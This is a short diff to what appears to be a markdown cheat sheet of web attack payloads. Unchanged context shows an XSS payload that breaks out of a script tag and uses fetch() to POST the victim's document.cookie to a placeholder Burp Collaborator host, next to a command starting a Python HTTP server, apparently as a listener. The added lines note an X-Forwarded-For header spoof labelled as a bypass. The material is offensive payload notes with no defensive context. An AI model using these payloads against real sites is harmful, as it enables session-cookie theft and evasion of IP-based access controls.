@@ -1062,6 +1062,12 @@ python3 -m http.server -m 80
 ```
 </script> <script>fetch('https://<Collaborator>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>//
 ```
+-
+>bypass add
+```
+X-Forwarded-For: 1.1.1.1
+
+```
 
 
 
